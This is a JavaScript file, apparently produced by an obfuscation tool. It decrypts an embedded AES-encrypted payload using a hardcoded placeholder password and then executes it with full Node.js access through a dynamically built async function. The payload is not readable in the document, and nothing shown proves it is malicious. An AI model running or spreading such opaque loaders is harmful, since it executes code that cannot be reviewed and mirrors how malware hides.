// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 4.1.1                                     ║
// ║  Encrypted: 2026-07-27 21:34:23 UTC                   ║
// ║  Cipher   : PBKDF2+AES-256-GCM                        ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v4.1.1
(async()=>{
  if(typeof require==='undefined')throw new Error('[Obfuscationary] Use Node.js.');
  const _b64='T0JGdjSPyRpkl73m/RnaEBs5cW77f7JkkoCWrbA9E0JUaBZ6DgsemonO+35gVFavj+M3ADOMwKzjgsxXWj8tetpJug+Bbo/rMQJc2GsYxeii9DkboHWrp+vn6iqc4LhypkRsrAxmlXQ49jPji7gYM0Ny+b/vkiXjZAqSPmqCkAlTou7+0pqw+DA8GL3UnpuVoLCvMxjIGQZlxaCe8xW1BJ3QeG1g+9ilYvo1lM6aQxrKZM4/EkjHmb9IPJA6KcFoclBcPC6LRHYNYTGwtSQmkRtnfRjVsnzZaL+OeBkfIh9V81NyE3sttmCbfSemNDXcH2pg5MWDtF7UrPlKSlRDLRZrdbD7HLK4WoJ3E5iKxpKxXtmZlVbpScAf/VhAX44H/MrtrHjWhZSUp1XzFrywIe7iyYEcvbz71E4fg8Taokv63P3kidMsamkX7Gsv4GLtawiUPD0xvucgBKYa0qNb9qibCvde3jjZcnpIvRW3/rjrqtTgwqHllKfPpJxm7jNu9kWtuFaGmCTFyH6yo2ivxk6U1UCwRqRSlaU2h+Hl2eitDdXzuy+Ol+X4f6LGloeSqeKy2zH47x1oKyoQiezFBVmw42g3iR94gJRAcPNtUg2Cf0mPeOxtnQx6E/GaxVb/6RjWcPqsCSBxblzfs07WmSueddbISmVXOfukead0sSX/HuT2i/hKp0szQ+m5pDTwRBS4B08TZMxk9bGMUgBdaBVcYkU+G8Y7KQz0xsTXBdt/7chKp6N1EKp+Imt6Us1zDPxoHf2teCz9LwiK2xP63OE8oV2PIYB0jjzJi/zKJLbhH12E7jE8oBALwppxWtxfgqtaNnVfq6G8ovEcy1F4fSD+nlYKrwrDnjYJOO0QNE2gLlv06QPA5oJvji53y1lfjboUTJZ780Z3PYhSUH8ElafbGid1my5HFHxDeKUrPiXsbk3veT0THfK5Z1pB6HTA0qJSIzmbWa4fY76kxd2qUtLHlv/KsPZvaCIBrDFfhZfVIoEr34vhYRKkJ2Gxpvb/mfQ1Q0EWzGswhd7/Ai2qOzi6xz6zm+AshPdT1Kl9X0DBeb0K0359nofBx3hAuiff2S9gDTP6wDWXeW3A1iAhkjolWY7cqSzM1LAmMF2a/valWE7kAzEAd1D2IMLFqD43ST2Xy7iPqOEJAxHrGu1YhRjNxBnHynLG7vZU3rFjNEiSBaemNG/kDUinOd1zgDYsKNTzl/MUez1LbSLu9Cx33zfpp7+uNgm85Cey+xwO1W+X4hkePMwn8AVnZ8KX1MI8H1iB9TvjpT7Xo6JVVIXzyiiryHLhriANaUQK0wYNJlkeKc8UFe7E1n3OHInGqSg6t9gnVtfpAHXV9Fsc1mKWDOhGGYXoZaQYjG/+fCgSK8VLhzyAGiA/WPU5tey2POUimBcz0d81kK7FgmP5Fn8DLpsj6C39ovDNhCNkWRxxd/run8zaot2Yn68Bp4zp4wPudd8ePH1T+kdRICGsBNPk7Lo1INVaNa34C8oxE3yo5v/hUEpRiDWNFzVgg2W8QAST42rfkhf/FZaJHrzYQ07hj3R68FYgCz0lza991qmeqDNL1xoVTY8bF/uHZbcumVJRKIhaeS6SCB+15yJ3Dyc0g7Wios4AgnUF1UDRsU2ExFpjThNdlAjqIgfB1IHYMNqefTOBmODf/mOxW/T67JmsSXFiilFuRougdymf10MrYbSK9MhEchJE1cSmtuIPE7zuwISlS8+sXmV9YAFO3XxILxu/EXG6/7amwU63/VuztOSHZTJqqWdsDMB9ABGFBWVBKqLujzzIXN4RV7fXE0ovpgpQOkVMZqAICoPjuenxEA4FmFz/VoH9l2pOHJlGVmlJdm+wLuyUYNOSJsqs1/tOiLHWvoc=';const _IH='ee7511dfc3cb2249974d5796e35c6f8bc466afc74c9618fea74f3a8a51679cd8';let _src;

  const _PWDS=["change_this_to_a_long_random_secret"];
  const _MAGIC="OBFv4";
  const _c2=require('crypto');
  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
  let _d=Buffer.from(_b64,'base64');
  for(let i=_PWDS.length-1;i>=0;i--){
    const pw=_PWDS[i];
    if(!_d.toString('utf8',0,5).startsWith(_MAGIC))throw new Error('[Obfuscationary] Bad header');
    const blob=_d.slice(5);
    const s=blob.slice(0,16), iv=blob.slice(16,28), ct=blob.slice(28);
    const kk=_c2.pbkdf2Sync(pw,s,100000,32,'sha256');
    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);
    const tag=ct.slice(ct.length-16), cdata=ct.slice(0,ct.length-16);
    dc.setAuthTag(tag);
    _d=Buffer.concat([dc.update(cdata),dc.final()]);
  }
  _src=_d.toString('utf8');

  const _import=(m)=>import(m);
  const _F=Object.getPrototypeOf(async function(){}).constructor;
  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
})();
